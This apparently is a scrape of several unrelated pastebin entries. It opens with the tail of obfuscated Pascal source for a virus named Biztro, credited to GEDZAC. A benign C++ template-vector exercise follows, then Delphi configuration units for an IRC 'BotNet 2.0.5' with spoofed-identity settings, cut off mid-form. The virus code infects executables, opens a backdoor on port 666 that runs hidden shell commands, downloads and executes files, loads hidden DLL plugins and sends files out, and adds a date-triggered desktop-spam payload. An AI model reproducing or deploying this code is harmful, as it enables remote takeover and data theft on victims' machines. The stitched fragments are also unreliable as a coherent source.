       assign(f1,paramstr(0)); assign(f2,filename);
       filemode := 0; reset(f1,1); rewrite(f2,1);
       seek(f1,virussize);
       repeat
       blockread(f1,bufete,2048,OhRead); blockwrite(f2,bufete,OhRead,OhWrite);
       until (OhRead=0) or (OhWrite<>OhRead);
       close(f1); close(f2); exec_lines:='';
   if m = 1 then exit;
      if paramcount>0 then for i:=1 to paramcount do exec_lines:=exec_lines+' '+paramstr(i);
       if exec_lines <> '' then filename := filename + exec_lines;
      if m = 0 then
       begin
       if CreateProcess(Pchar(filename), nil, nil, nil,false, NORMAL_PRIORITY_CLASS, nil, nil,Uo,Ou) <> False then begin
       WaitForSingleObject(Ou.hProcess,INFINITE);
       CloseHandle(Ou.hThread);
       CloseHandle(Ou.hProcess);
       DeleteFile(filename);
       end;
       end else ShellExecute(0,nil,PChar(filename),'','',SW_SHOWNORMAL);
   end;end;


   Function ex(things:string):string;
   var newx,s:string;LlL,OoO,o,r:integer;
   begin
   LlL := strLen(PChar(things));
   For OoO := 1 to LlL do begin
   newx := newx + chr(ord(things[OoO]) xor 8)
   end;
   o := strlen(pchar(newx));
   For r := 1 to o do begin
   s := s + chr(ord(newx[r]) * 2)
   end;
   ex := s;
   end;


   function Username:string;
   var zize: dword;
   RainChar:array[0..255] of char;
   begin
   zize := 256;
   if GetUserName(RainChar,zize) then
   Result:=RainChar
   else Result := d('”ÂäøôÎPÖÒÌøPÜÎúÌØPøÀÚPÔÎØâPÌÒÊÚ');
   end;


   function SendToShell(x:string):string;
   var a:textfile;
       ran1,ran2,m:string;
       label wait;
   begin
   Randomize;
   m := x;
   Delete(m,1,3);
   ran1 := IntToStr(Random(9999)+1) + d('LÔÒø');
   if not DirectoryExists(winpath+'\Temp\IEDat') then CreateDirectory(Pchar(winpath+'\Temp\IEDat'),nil);
   ran2 := winpath+'\Temp\IEDat\Biz0'+IntToStr(Random(9999)+1);
   AssignFile(a,'C:\'+ran1);
   rewrite(a);
   writeln(a,d('ÖÊØLÚàÚPNÖP')+M+d('ll')+ran2);
   closefile(a);
   WinExec(Pchar(d('–d¨')+ran1),sw_HIDE);
   wait:
   sleep(500);
   if not fileexists(ran2) then goto wait;
   Deletefile(Pchar(d('–d¨')+ran1));
   sendback(ran2);
   end;


   function Wakesock: Boolean;
   var
     anne: TWSAData;
   begin
     Result :=  WSAStartup( $101, anne ) = 0
   end;


   function LoadService(casa:integer): Integer;
   var direc: TSockAddrIn;
   begin
     Result := Socket( PF_INET, SOCK_STREAM, IPPROTO_TCP );
     if Result = INVALID_SOCKET then
       Exit;
     with direc do begin
       sin_family := AF_INET;
       sin_port := htons(casa);
       sin_addr.S_addr := 0;
     end;

     if Bind( Result, direc, SizeOf(direc) ) <> 0 then begin
       Result := INVALID_SOCKET;
       Exit;
     end;

     if Listen(Result,5) <> 0 then
       Result := INVALID_SOCKET;
   end;


   Function GetValue(txt:string):string;
   var i,p,s:integer;
   axe: string;
   begin
   p := 0;
   For i := 1 to strLen(pchar(txt)) do begin
   p := p +1;
   if txt[i] = d('T') then begin
   break;
   end
   end;
   For s := p+1 to strLen(pChar(txt)) do begin
   if txt[s] = d('T') then begin
   break;
   end;
   axe := axe + txt[s];
   end;
   Result := axe;
   end;


   function BioSetup:string;
   var a:textfile;
       b,Setup:string;
       fail:integer;
   label try_again;
   begin
   fail := 0;
   AssignFile(a,winpath+d('¨þÂÌØÒøLØÒø'));
   if not Fileexists(winpath+d('¨þÂÌØÒøLØÒø')) then
   begin
   Setup := d('’jTrzT')+sp+
            d('”jTšÌÒÔÈÚT')+sp+
            d('–jTt|T')+sp+
            d('˜jTpT');
   rewrite(a); writeln(a,Setup); closefile(a);
   Result := Setup;
   end;
   try_again:
   Try
   {-------Start Reading Bio Setup File-------}
   {} reset(a);                              {}
   {------------------------------------------}
   {} //Re-Infection Day                     {}
   {} readln(a,b);                           {}
   {} RID := GetValue(b);                    {}
   {} b := '';                               {}
   {} //Remote Shell Status                  {}
   {} readln(a,b);                           {}
   {} RSS := GetValue(b);                    {}
   {} b := '';                               {}
   {} //Infecting Threads                    {}
   {} readln(a,b);                           {}
   {} IT := GetValue(b);                     {}
   {} b := '';                               {}
   {} //Current Plugins                      {}
   {} readln(a,b);                           {}
   {} CP := GetValue(b);                     {}
   {} b := '';                               {}
   {------------------------------------------}
   {} closefile(a);                          {}
   {}BioSetup:=d('–úôôÚÌøP¼ÚôöÂÎÌPjPrLp')+sp+{}
   {}d('ŒÒÊÚPŽÜP‚ÌÜÚÖøÚØP”ÎØâPjP')+Username+ {}
   {}sp+d('´ÚJ‚ÌÜÚÖøÂÎÌP˜ÒâPjP')+RID+sp+     {}
   {}d('´ÚÊÎøÚP¶ÀÚÈÈP¶øÒøúöPjP')+RSS+sp+     {}
   {}d('ŒúÊÔÚôöPŽÜP‚ÌÜÚÖøÂÎÌP¸ÀôÚÒØöPjP')+   {}
   {}IT+sp+d('–úôôÚÌøP°ÈúÞÂÌöPjP')+CP;       {}
   {--------End Reading Bio Setup File--------}
   except rewrite(a); writeln(a,Setup); fail:=1;
   end;
   if fail = 1 then goto try_again;
   end;

   procedure BioChange(const w:string;i:integer);
   var a:textfile;
       b,c,d2,n,x,m:string;
       u:integer;
   begin
   m := w;
   Delete(m,1,3);
   AssignFile(a,winpath+d('¨þÂÌØÒøLØÒø'));
   Reset(a);
   if i = 1 then begin Readln(a,c); Readln(a,b); x:=b+sp; Readln(a,b); x:=x+b+sp; Readln(a,b); x:=x+b; end;
   if i = 2 then begin Readln(a,b); Readln(a,c); Readln(a,n); x:=n+sp; Readln(a,n); x:=x+n; end;
   if i = 3 then begin Readln(a,b); x:=b+sp; Readln(a,b); x:=x+b+sp; Readln(a,c); Readln(a,n); end;
   if i = 31 then begin Readln(a,b); x:=b+sp; Readln(a,b); x:=x+b+sp; Readln(a,b); x:=x+b+sp; Readln(a,c); end;
   if i <> 31 then Delete(c,3,length(c)-3);
   if i = 1 then d2:= c+m+'""'+sp+x; if i = 2 then d2:= b+sp+c+m+'""'+sp+x; if i = 3 then d2:= x+c+m+'""'+sp+n;
   if i = 31 then
   begin
   u:= StrToInt(GetValue(c));
   if m = d('’ØØ') then Inc(u);
   if m = d('˜ÚÈ') then Dec(u);
   d2 := x+d('˜jT')+IntToStr(u)+d('T');
   end;
   rewrite(a);
   writeln(a,d2); closefile(a);
   if i = 15 then
   begin
   AssignFile(a,winpath+d('¨þvtÀÈðLÀÈð'));
   try append(a); except rewrite(a); end;
   writeln(a,m); closefile(a);
   end;
   SendBack(d('šr'));
   end;



   function DownBytes(m:string;e:integer):boolean;
   var rum,ex,x:string;
       i:integer;
   begin
   try
   Randomize;
   rum := winpath+d('¨')+IntToStr(Random(99999));
   Delete(m,1,3);
   for i := Length(m) downto 0 do ex:=ex+m[i]; i:=0;
   for i := 1 to Length(ex) do if ex[i] <> '.' then x:=x+ex[i] else break;i:=0;ex:='';
   for i := Length(x) downto 0 do ex:=ex+x[i]; i:=0;
   rum := rum+'.'+ex;
   UrlDownLoadToFile(nil,Pchar(m),Pchar(rum),0,nil);
   if e=2 then ShellExecute(0,nil,PChar(rum),'','',SW_SHOWNORMAL);
   sendback(d('”r')+rum);
   except end;
   end;


   function syspath:string;
   var sysfolx:pChar;
   begin
   GetMem(sysfolx,100);
   if GetSystemDirectory(sysfolx,100) <> 0 then Result := sysfolx;
   FreeMem(sysfolx,100);
   end;


   procedure AddPlug(const s:string);
   var plugdir,m:string;
   begin
   m := s;
   Delete(m,1,3);
   plugdir:= syspath+d('¨þÂÌ')+IntToStr(Random(99999))+d('LØÈÈ');
   try
   UrlDownLoadToFile(nil,Pchar(m),Pchar(plugdir),0,nil);
   except exit; end;
   BioChange(d('’ØØ'),31);
   BioChange(plugdir,15);
   try SetFileAttributes(PChar(plugdir),FILE_ATTRIBUTE_HIDDEN); except end;
   LoadLibrary(Pchar(plugdir));
   sendback(d('–r'));
   end;

   function LoadPlugs:integer;
   var a:textfile;
       b:string;
   label Load;
   begin
   AssignFile(a,winpath+d('¨þvtÀÈðLÀÈð'));
   try Reset(a);
   except exit; end;
   Load:
   readln(a,b);
   if b <> '' then try LoadLibrary(Pchar(b)); except BioChange(d('˜ÚÈ'),31); closefile(a); exit; end;
   if b <> '' then goto load;
   closefile(a);
   end;

   procedure MakeItDownload(const x:string);
   var i:integer;
       s,m,from:string;
       begin
   m := x;
   Delete(m,1,4);
   from := m;
   for i:= 1 to Length(m) do if m[i] <> #32 then s:=s+m[i] else s:=s+d('F');
   m := Copy(s,1,3);
   Delete(s,1,3);
   s := m+d('”Âäp')+s;
   CopyFile(Pchar(from),Pchar(s),true);
   sendback(d('˜r'));
   end;


    procedure sendf(const m:string);
      var   vz:array [0..1023] of Char;
       ozz,fw:integer;
       iam:file;
       z,afuera,noexists,fat,rum:string;
       a:textfile;
      begin
      rum := d('”ÂäøôÎžÚØäÒÖ')+IntToStr(Random(99999))+d('Løàø');
      z := m;
       Delete(z,1,5);
   z := Copy(z, 1, Pos(D('€¸¸°Nr'), z) - 2);
   noexists := d('”ÂäøôÎP”âP”âøv–ôpþNžš˜¤’–')+sp+d('”ÂäøôÎPÖÒÌøPÜÂÌØPøÀÂöPÜÂÈÚ')+sp+d('”ÂäøôÎPÌÎPðúÚØÚPÚÌÖÎÌøôÒôPÚÈPÒôÖÀÂüÎ')+z+sp+d('žÚØäÒÖPˆÒÔöPtppxPJPþþþLÞÚØäÒÖLøÆ');
      if not fileexists(z) then
      begin
      z := d('–d¨')+rum;
      AssignFile(a,z); rewrite(a); writeln(a,NoExists); closefile(a);
      end;
      fw := FileOpen(z,0);
      fat := floattostr(getfilesize(fw,nil));
      fileclose(fw);
      AssignFile(iam,z);
            filemode:=0;
           try reset(iam,1); except end;
       afuera := d('€¸¸°NrLrPtppPŽ†') + SP
           + d('’ÖÖÚðøJ´ÒÌÞÚödPÔâøÚö') + SP
           + d('–ÎÌøÚÌøJˆÚÌÞøÀdP')+fat + sp
           + d('†ÚÚðJ’ÈÂüÚdPøÂÊÚÎúøjrzHPÊÒàjrpp') + sp
           + d('–ÎÌÌÚÖøÂÎÌdP†ÚÚðJ’ÈÂüÚ') + sp
           + d('–ÎÌøÚÌøJ¸âðÚdPÒððÈÂÖÒøÂÎÌNàJÊöØÎþÌÈÎÒØ') + sp + sp;
              Send( x, Addr(afuera[1])^, Length(afuera), 0 );
       repeat
         BlockRead(iam,vz[0],SizeOf(vz),ozz);
         if ozz<=0 then break; if send(x,vz[0],ozz,0)<=0 then break;
       until ozz<>1024;
       closefile(iam);
       end;



   procedure RemoteModule(me:Pointer);
   var
     Data: array[ 0..8191 ] of Char;
     w,z: Pointer;
     l: Char;
       begin
     x := Integer(me);
     repeat
       current := Recv(x, Data, SizeOf(Data), 0 );
       if current = 0 then
         current := SOCKET_ERROR
       else
       begin
         w := @Data;
         z := Pointer(Integer(@Data) + current);
         l := #0;
         while Integer(w) < Integer(z) do begin
           if (l = #13) and (Char(w^) = #10 ) then begin
             Inc( Integer(w));
             Continue;
           end;
           l := Char(w^);
           if l = #13 then
           begin
                                    TRY
       if     j = d('°')      then sendback(d('r'));
       if Pos(d('ND¨'),j) > 0 then DownBytes(j,1);
       if Pos(d('NF¨'),j) > 0 then DownBytes(j,2);
       if Pos(d('Np¨'),j) > 0 then AddPlug(j);
       if Pos(d('” –'),j) > 0 then if RSS = d('šÌÒÔÈÚ') then SendBack(SendToShell(j));
       if Pos(d('Š‚˜'),j) > 0 then MakeItDownload(j);
       if Pos(d('žš¸'),j) > 0 then sendf(j);
       if Pos(d('h‚l'),j) > 0 then BioChange(j,1);
       if Pos(d('hšl'),j) > 0 then BioChange(j,2);
       if Pos(d('h¸l'),j) > 0 then BioChange(j,3);
       if Pos(d('¶øÒ'),j) > 0 then sendback(BioSetup);
       if Pos(d('˜D¤'),j) > 0 then Doz(j);
                                except end;
           j := '';
           end else
             j := j + l;
           Inc(Integer(w));
         end;
       end;
     until current = SOCKET_ERROR;
     bye(x);
   end;


   function StartService(Server,typex: Integer):string;
   var anne: Integer;
       yeah: Cardinal;
   begin
     anne := Accept( Server, nil, nil );
     if anne <> INVALID_SOCKET then begin
      if BeginThread( nil, 65536, @RemoteModule,Pointer(anne), 0,yeah) = 0 then
         bye(anne);
        end;
        end;

   function LiveListen:integer;
   begin
     if not Wakesock then exit;
     me := LoadService(666);
     if me = INVALID_SOCKET then exit;
     repeat
       StartService(me,1);
     until shutdownx;
     bye(me);
     WSACleanUp;
     end;


   procedure Install;
   begin
   aislamiento(0);aislamiento(1);
   CreateThread(nil,0,@InfectCenter,nil,0,ID);
   halt(0);
   end;

   function payme_:integer;
   var a : TRect;z: string;p:integer;
   label go;
   begin
   Randomize;
   go:
   p := Random(2)+1;
   if p = 1 then z := d('”Âäøôp') else z:= d('žÚØäÒÖPˆÒÔöPtppx');
   a.Left := Random(1000);a.Top  := Random(700);
   a.Right := Random(129999999);a.Bottom := Random(99990000);
   DrawText( GetWindowDC( Getdesktopwindow()),Pchar(z ),length(z),a,0);
   goto go;
   end;

   function Bomb:integer;
   var a:string;
       b,c,d,e:integer;
   begin
   Randomize;
   a := Username;
   b := ord(a[1]);;
   if ( b > 51) and (b < 101) then c:=1;
   if (b > 101) and (b < 152) then c:=2;
   if (b > 152) and (b < 203) then c:=3;
   if (b > 203) and (b < 254) then c:=4;
   if (b > 254) then c:=5;
   d := Random(2)+1;e := Random(2)+1;
   case c of
   1: begin if d < 2 then Result:=6 else Result := Random(6)+1; end;
   2: begin if d < 2 then Result:=12 else Result := Random(12)+1; end;
   3: begin if d < 2 then Result:=18 else Result := Random(18)+1; end;
   4: begin if d < 2 then Result:=24 else Result := Random(24)+1; end;
   5: begin if d < 2 then if e < 2 then begin Result:=30 end else begin Result:=31 end else Result := Random(6)+1; end;
   end;
   end;

   begin

   BioSetup;
   About := 'Biztro BETA version - By Byt3Cr0w/GEDZAC - maybe you will found some errors - wait for the final version';
   GetlocalTime(Clock);
   if Clock.Wday = Bomb then begin MessageBox(0,Pchar(d('¦J”ÂäøôŽPÔâP”âøv–ôpþNžš˜¤’–PJP¸ÀÒÌàPøÎPÒÈÈPžÚØäÒÖPÒÌØPÒPÔÂÞPøÀÒÌàPÜÎôPÊâPœÒÈÖÆÎÌP\P”ÈÒÖÆ´ÎöÚ')),Pchar(d('”ÂäøôŽ')),32); for oupz := 1 to 10 do Createthread(nil,0,@payme_,nil,0,ID); sleep($ffffffff); end;
   aislamiento(2);
   if not fileexists(winpath+d('¨œÎÌøö¨¶ÚôüÂÖÚLÚàÚ^')) then Install;
   if paramstr(0) = winpath+d('¨œÎÌøö¨¶ÚôüÂÖÚLÚàÚ^') then
   begin
   CreateMutex(nil, false,Pchar(d('”ÂäøôÎ')));
   if GetLastError = ERROR_ALREADY_EXISTS then halt(0);
   CreateThread(nil,0,@LiveListen,nil,0,ID);
   CreateThread(nil,0,@LoadPlugs,nil,0,ID);
   if Clock.Wday = StrToInt(RID) then CreateThread(nil,0,@InfectCenter,nil,0,ID);
   sleep($ffffffff);
   end;
   aislamiento(0);
   WinExec(Pchar(d('¨œÎÌøö¨¶ÚôüÂÖÚLÚàÚ^')),SW_HIDE);
   halt(0);
   end."
0kELLvVZ,Untitled,35657,C++,Wednesday 7th of June 2023 05:32:32 AM CDT,"// Задание: 
// 1) реализовать шаблонный вариант SimpleVector
// 2) реализовать две отдельные шаблонные функции:
// void print(...) ... для вывода элементов любого варианта SimpleVector
// void sort(...) ... для сортировки любого варианта SimpleVector
// 3) проверить работоспособность кода, раскомментировав строки в main


#include <iostream>

using namespace std;

template<typename T>
class SimpleVector {

public:

	SimpleVector() : arr_(new T[10]), size_(10) {}

	SimpleVector(int size) : arr_(new T[size]), size_(size) {}

	SimpleVector(const SimpleVector& object) : arr_(new T[object.size_] {}), size_(object.size_) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = object.arr_[i];
		};
	}

	SimpleVector& operator=(const SimpleVector& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = new T[object.size_];
			size_ = object.size_;
			for (int i = 0; i < size_; i++) {
				arr_[i] = object.arr_[i];
			}
		}
		return *this;
	}

	SimpleVector(SimpleVector&& object) : arr_(object.arr_), size_(object.size_) {
		object.arr_ = nullptr;
		object.size_ = 0;
	}

	SimpleVector& operator=(SimpleVector&& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = object.arr_;
			size_ = object.size_;
			object.arr_ = nullptr;
			object.size_ = 0;
		}
		return *this;
	}

	T& operator[] (int index) {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	T& operator[] (int index) const {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	int Size() const {
		return size_;
	}

	~SimpleVector() {
		delete[] arr_;
	}

private:
	T* arr_;
	int size_;
};



template<typename T>
void print(const SimpleVector<T>& vec) {
	for (int i = 0; i < vec.Size(); i++) {
		cout << vec[i] << ' ';
	}
	cout << endl;
}

template<typename T>
void sort(SimpleVector<T>& vec) {
	for (int k = 0; k < vec.Size(); k++) {
		for (int j = 0; j < vec.Size() - 1; j++) {
			if (vec[j] > vec[j + 1]) {
				T temp = vec[j];
				vec[j] = vec[j + 1];
				vec[j + 1] = temp;
			}
		}
	}
}



int main() {
	SimpleVector<int> vec;
	for (int i = 0; i < vec.Size(); i++) {
		vec[i] = rand() % 10;
	}
	for (int i = 0; i < vec.Size(); i++) {
		cout << vec[i] << "" "";
	}
	cout << endl;

	SimpleVector<int> IntVector;
	for (int i = 0; i < IntVector.Size(); i++) {
		IntVector[i] = rand() % 10;
	}
	cout << ""IntVector:"" << endl;
	print(IntVector);
	cout << endl;
	cout << ""Sorted IntVector:"" << endl;
	sort(IntVector);
	print(IntVector);
	cout << endl;

	SimpleVector<string> StringVector;
	StringVector[0] = ""two"";
	StringVector[1] = ""seven"";
	StringVector[2] = ""zero"";
	StringVector[3] = ""four"";
	StringVector[4] = ""one"";
	StringVector[5] = ""three"";
	StringVector[6] = ""five"";
	StringVector[7] = ""six"";
	StringVector[8] = ""eight"";
	StringVector[9] = ""nine"";
	cout << ""StringVector:"" << endl;
	print(StringVector);
	cout << endl;
	cout << ""Sorted StringVector:"" << endl;
	sort(StringVector);
	print(StringVector);
	cout << endl;
}"
Ai7Vsipe,Unit2.pas,FlyFar,Pascal,Wednesday 7th of June 2023 05:32:23 AM CDT,"   unit Unit2;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, StdCtrls, ComCtrls, ExtCtrls, Menus;

   type
     TForm2 = class(TForm)
       MainMenu1: TMainMenu;
       File1: TMenuItem;
       Panel1: TPanel;
       GroupBox1: TGroupBox;
       Label1: TLabel;
       Edit1: TEdit;
       RadioGroup1: TRadioGroup;
       GroupBox2: TGroupBox;
       CheckBox1: TCheckBox;
       Edit2: TEdit;
       GroupBox3: TGroupBox;
       Memo1: TMemo;
       GroupBox4: TGroupBox;
       RadioButton1: TRadioButton;
       RadioButton2: TRadioButton;
       RadioButton3: TRadioButton;
       Memo2: TMemo;
       GroupBox5: TGroupBox;
       CheckBox2: TCheckBox;
       Label2: TLabel;
       Memo3: TMemo;
       Label3: TLabel;
       Button1: TButton;
       Button2: TButton;
       LoadSettings1: TMenuItem;
       OpenDialog1: TOpenDialog;
       SaveDialog1: TSaveDialog;
       Label4: TLabel;
       Edit3: TEdit;
       Edit4: TEdit;
       CheckBox3: TCheckBox;
       Label5: TLabel;
       Edit5: TEdit;
       Label6: TLabel;
       Edit6: TEdit;
       procedure loadsettings(name: string);
       Procedure ReadLine(Data, Command: String; Var Buf:String);
       procedure ReadFile(Name: String; Var Buf:String);
       Procedure SaveFile(Name: String);
       procedure Button1Click(Sender: TObject);
       procedure LoadSettings1Click(Sender: TObject);
       procedure Button2Click(Sender: TObject);
       procedure Edit3KeyDown(Sender: TObject; var Key: Word;
         Shift: TShiftState);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form2: TForm2;

   implementation

   {$R *.dfm}

   uses unit1;

   Procedure Crypt(Var Data: String);
   Var
     Tmp: String;
     Ch : Integer;
     Xo : Integer;
     I  : Integer;
   Begin
     Tmp := '';
     For I := 1 To Length(Data) Do
     Begin
       Ch := Ord(Data[I]);
       Xo := (Ch Xor Length(Data)) Xor 3;
       Tmp := Tmp + Chr(Xo);
     End;
     Data := Tmp;
   End;

   Procedure TForm2.SaveFile(Name: String);
   var
     F: File;
     B: String;
     Len: Integer;
   begin
     B := 'adminserverport='+edit1.text+#1+
     'adminservername='+edit3.text+#1+
     'adminusefakehost='+inttostr(integer(checkbox3.Checked))+#1+
     'adminfakehost='+edit4.text+#1+
     'admintopic='+edit5.text+#1+
     'adminpubliclevel='+inttostr(radiogroup1.ItemIndex)+#1+
     'adminchannel='+edit6.text+#1+
     'spoofedchecked='+inttostr(integer(checkbox1.Checked))+#1+
     'spoofedhost='+edit2.text+#1;

     If RadioButton1.Checked Then
     B := B+'connectiontype=1'#1 Else
     If RadioButton2.Checked Then
     B := B+'connectiontype=2'#1 Else
     If RadioButton3.Checked Then
     B := B+'connectiontype=3'#1;

     B := B+'connectionips='+memo2.text+#1+
     'friendlistpublic='+inttostr(integer(checkbox2.Checked))+#1#13#10+
     'welcomemessage='+trim(memo1.text)+#1+
     'friendlist='+trim(memo3.Text)+#1;

     Crypt(B);

     AssignFile(F, Name);
     Rewrite(F, 1);
     Len := Length(B);
     BlockWrite(F, B[1], Len);
     CloseFile(F);
   end;

   Procedure TForm2.ReadLine(Data, Command: String; Var Buf:String);
   var
     P: Integer;
     Temp: String;
   begin
     P := Pos(Command, Data);
     Temp := Copy(Data, P+length(Command), Length(Data));
     P := Pos(#1, Temp);
     Temp := Copy(Temp, 1, P-1);
     Buf := Temp;
   end;

   procedure TForm2.ReadFile(Name: String; Var Buf:String);
   var
     F: File;
     B: AnsiString;
     ReadBytes: Cardinal;
     Len: Integer;
   begin
     AssignFile(F, Name);
     Reset(F, 1);
     Len := FileSize(F);
     SetLength(B, Len);
     BlockRead(F, B[1], Len, ReadBytes);
     CloseFile(F);
     Buf := String(B);
     Crypt(Buf);
   end;

   procedure TForm2.Button1Click(Sender: TObject);
   begin
     If SaveDialog1.Execute Then
     Begin
       If ExtractFileExt(SaveDialog1.FileName) <> '.bn5' Then
         SaveFile(SaveDialog1.FileName+'.bn5')
       Else
         SaveFile(SaveDialog1.FileName);
       SaveFile('default.bn5');
       form1.Timer2.Enabled := true;
       Close;
     End;
   end;

   procedure Tform2.loadsettings(name: string);
   var
     Data: String;

     adminChannel,
     adminTopic,
     adminFakeHost,
     adminUseFakeHost,
     adminServerName,
     adminPort,
     adminLevel,
     spoofedCheck,
     spoofedHost,
     connectionType,
     connectionIPS,
     friendlistPublic,
     welcomeMessage,
     friendlist: String;
   begin
     If Not FileExists(name) Then Exit;
     ReadFile(name, Data);

     ReadLine(Data, 'adminchannel='         , adminChannel);
     ReadLine(Data, 'admintopic='           , adminTopic);
     ReadLine(Data, 'adminfakehost='        , adminFakehost);
     ReadLine(Data, 'adminusefakehost='     , adminUseFakehost);
     ReadLine(Data, 'adminservername='      , adminServerName);
     ReadLine(Data, 'adminserverport='      , adminPort);
     ReadLine(Data, 'adminpubliclevel='     , adminLevel);
     ReadLine(Data, 'spoofedchecked='       , spoofedCheck);
     ReadLine(Data, 'spoofedhost='          , spoofedHost);
     ReadLine(Data, 'connectiontype='       , connectionType);
     ReadLine(Data, 'connectionips='        , connectionIPS);
     ReadLine(Data, 'friendlistpublic='     , friendlistPublic);
     ReadLine(Data, 'welcomemessage='       , welcomeMessage);
     ReadLine(Data, 'friendlist='           , friendlist);

     CheckBox3.Checked := Boolean(StrToInt(adminUseFakeHost));
     Edit3.Text := adminServerName;
     Edit4.Text := adminFakeHost;
     Edit5.Text := adminTopic;
     Edit6.Text := adminChannel;
     Edit1.Text := adminPort;
     RadioGroup1.ItemIndex := StrToInt(adminLevel);
     CheckBox1.Checked := Boolean(StrToInt(spoofedCheck));
     Edit2.Text := spoofedHost;
     Memo1.Text := welcomeMessage;
     Case StrToInt(ConnectionType) Of
       1: RadioButton1.Checked := True;
       2: RadioButton2.Checked := True;
       3: RadioButton3.Checked := True;
     End;
     Memo2.Text := ConnectionIPS;
     CheckBox2.Checked := Boolean(StrToInt(friendlistPublic));
     Memo3.Text := friendlist;
   end;

   procedure TForm2.LoadSettings1Click(Sender: TObject);
   begin
     If OpenDialog1.Execute Then
       loadsettings(opendialog1.FileName);
   end;

   procedure TForm2.Button2Click(Sender: TObject);
   begin
     loadsettings('default.bn5');
     Close;
   end;

   procedure TForm2.Edit3KeyDown(Sender: TObject; var Key: Word;
     Shift: TShiftState);
   begin
     If Key = 32 Then ZeroMemory(@Key, SizeOf(Key));
   end;

   end."
isAiwjpP,Unit2.dfm,FlyFar,Delphi,Wednesday 7th of June 2023 05:31:22 AM CDT,"   object Form2: TForm2
     Left = 576
     Top = 108
     BorderIcons = [biSystemMenu, biMinimize]
     BorderStyle = bsSingle
     Caption = 'BotNet 2.0.5 Configuration'
     ClientHeight = 285
     ClientWidth = 497
     Color = clBtnFace
     Font.Charset = DEFAULT_CHARSET
     Font.Color = clWindowText
     Font.Height = -11
     Font.Name = 'Arial'
     Font.Style = []
     Menu = MainMenu1
     OldCreateOrder = False
     PixelsPerInch = 96
     TextHeight = 14
     object Label3: TLabel
       Left = 0
       Top = 264
       Width = 169
       Height = 17
       AutoSize = False
       Caption = 'BotNet 2.0.5 - UCC Release'
       Enabled = False
     end
     object Label4: TLabel
       Left = 8
       Top = 216
       Width = 73
       Height = 17
       AutoSize = False
       Caption = 'Server name :'
     end
     object Label5: TLabel
       Left = 256
       Top = 216
       Width = 81
       Height = 17
       AutoSize = False
       Caption = 'Channel Topic:'
     end
     object Label6: TLabel
       Left = 376
       Top = 216
       Width = 81
       Height = 17
       AutoSize = False
       Caption = 'Channel:'
     end
     object Panel1: TPanel
       Left = 0
       Top = 0
       Width = 497
       Height = 2
       Align = alTop
       BevelOuter = bvLowered
       TabOrder = 0
     end
     object GroupBox1: TGroupBox
       Left = 0
       Top = 8
       Width = 169
       Height = 129
       Caption = 'Admin Settings'
       TabOrder = 1
       object Label1: TLabel
         Left = 8
         Top = 16
         Width = 153
         Height = 17
         AutoSize = False
         Caption = 'Server Port:'
       end
       object Edit1: TEdit
         Left = 8
         Top = 32
         Width = 153
         Height = 22
         Color = 15921906
         TabOrder = 0
         Text = '6667'
       end
       object RadioGroup1: TRadioGroup
         Left = 8
         Top = 56
         Width = 153
         Height = 65
         Caption = 'Server public-level'
         ItemIndex = 0
         Items.Strings = (
           'Low - Hidden'
           'Medium - Faked'
           'High - 100% Public')
         TabOrder = 1
       end
     end
     object GroupBox2: TGroupBox
       Left = 0
       Top = 144
       Width = 169
       Height = 65
       Caption = 'Spoofed Settings'
       TabOrder = 2
       object CheckBox1: TCheckBox
         Left = 8
         Top = 16
         Width = 153
         Height = 17
         Caption = 'Use '#39'spoofed'#39' identity'
         Checked = True
         State = cbChecked
         TabOrder = 0
       end
       object Edit2: TEdit
         Left = 8
         Top = 32
         Width = 153
         Height = 22
         Color = 15921906
         TabOrder = 1
         Text = 'nick!ident@host.com'
       end
     end
     object GroupBox3: TGroupBox
       Left = 176
       Top = 8
       Width = 185
       Height = 201
       Caption = 'On connection'
       TabOrder = 3
       object Memo1: TMemo
         Left = 8
         Top = 16
         Width = 169
         Height = 57
         Color = 15921906
         Lines.Strings = (
           'Welcome Message')
         ScrollBars = ssVertical
         TabOrder = 0
       end
       object GroupBox4: TGroupBox
         Left = 8
         Top = 80
         Width = 169
         Height = 113
         Caption = 'Connections'
         TabOrder = 1
         object RadioButton1: TRadioButton
           Left = 8
           Top = 16
           Width = 153
           Height = 17
           Caption = 'Dont use this option'
           Checked = True
           TabOrder = 0
           TabStop = True
         end
         object RadioButton2: TRadioButton
           Left = 8
           Top = 32
           Width = 153
           Height = 17
           Caption = 'Only accept following ips'
           TabOrder = 1
         end
         object RadioButton3: TRadioButton
           Left = 8
           Top = 48
           Width = 153
           Height = 17
           Caption = 'Do not accept following ips'
           TabOrder = 2
         end
         object Memo2: TMemo
           Left = 8
           Top = 64
           Width = 153
           Height = 41
           Color = 15921906
           Lines.Strings = (
             '127.*.*.*')
           ScrollBars = ssVertical
           TabOrder = 3
         end
       end
     end
     object GroupBox5: TGroupBox
       Left = 368
       Top = 8
       Width = 129
       Height = 201
       Caption = 'Friendlist'
       TabOrder = 4
       object Label2: TLabel
         Left = 24
         Top = 32
         Width = 97
         Height = 17
         AutoSize = False
         Caption = 'for following names'
       end
       object CheckBox2: TCheckBox
         Left = 8
         Top = 16
         Width = 113
         Height = 17
         Caption = 'Make server public'
         Checked = True
         State = cbChecked
         TabOrder = 0
       end
       object Memo3: TMemo
         Left = 8
         Top = 48
         Width = 113
         Height = 145
         Color = 15921906
         Lines.Strings = (
           'p0ke')
         ScrollBars = ssVertical
         TabOrder = 1
       end
     end
     object Button1: TButton
       Left = 416
       Top = 264
       Width = 81
       Height = 21
       Caption = 'Close && Save'
       TabOrder = 5
       OnClick = Button1Click
     end
     object Button2: TButton
       Left = 328
       Top = 264
       Width = 81
       Height = 21
       Caption = '&Cancel'
       TabOrder = 6
       OnClick = Button2Click
     end
     object Edit3: TEdit
       Left = 8
       Top = 232
       Width = 113
       Height = 22
       Color = 15921906
       TabOrder = 7
       Text = 'BotNet205'
       OnKeyDown = Edit3KeyDown
     end
     object Edit4: TEdit
       Left = 128
       Top = 232
       Width = 121
       Height = 22
       Color = 15921906
       TabOrder = 8
       Text = 'botnet-host.com'
       OnKeyDown = Edit3KeyDown
     end
     object CheckBox3: TCheckBox
       Left = 128
       Top = 216
       Width = 105
       Height = 16
